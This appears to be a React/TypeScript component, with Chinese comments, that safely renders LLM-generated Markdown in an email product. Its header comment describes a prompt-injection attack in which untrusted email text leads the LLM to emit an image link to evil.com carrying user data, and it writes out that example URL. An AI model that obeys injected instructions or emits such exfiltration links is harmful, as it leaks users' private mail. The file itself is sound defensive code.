// SafeMarkdown：LLM 产出的 Markdown 一律经此组件渲染。
//
// 为什么存在：这里渲染的内容源自 LLM，而 LLM 读过不可信的邮件正文——攻击者
// 可借提示注入诱导 LLM 输出远程图片（![...](https://evil.com/log?d=<数据>)），
// 浏览器渲染时会零点击自动发起该请求，造成用户邮件数据外泄。因此：
// 1. 图片一律不渲染（img 是唯一无需用户交互就会发起外部请求的元素）；
// 2. urlTransform 只放行 http:/https:/mailto: 与站内相对路径；
// 3. 链接统一 target="_blank" + rel="noopener noreferrer nofollow"，
//    需用户主动点击，风险可接受，保留其实用价值。
import ReactMarkdown from 'react-markdown';
import remarkBreaks from 'remark-breaks';

/** 只放行 http/https/mailto 与站内相对路径；其余协议一律丢弃（返回空串）。 */
function safeUrlTransform(url: string): string {
  const t = url.trim();
  if (/^(https?:|mailto:)/i.test(t)) return url;
  // 无冒号即无协议 → 站内相对路径；排除 // 开头的协议相对地址
  if (t.indexOf(':') === -1 && !t.startsWith('//')) return url;
  return '';
}

interface Props {
  children: string;
  /** 为 true 时单个换行渲染为 <br>（手动条目详情是纯文本，需要保留换行）；
   *   breaks 只影响换行，不放宽任何 URL/元素限制。 */
  breaks?: boolean;
}

export default function SafeMarkdown({ children, breaks = false }: Props) {
  return (
    <ReactMarkdown
      remarkPlugins={breaks ? [remarkBreaks] : undefined}
      disallowedElements={['img']}
      unwrapDisallowed
      urlTransform={safeUrlTransform}
      components={{
        a: ({ node: _node, ...props }) => (
          <a {...props} target="_blank" rel="noopener noreferrer nofollow" />
        ),
      }}
    >
      {children}
    </ReactMarkdown>
  );
}
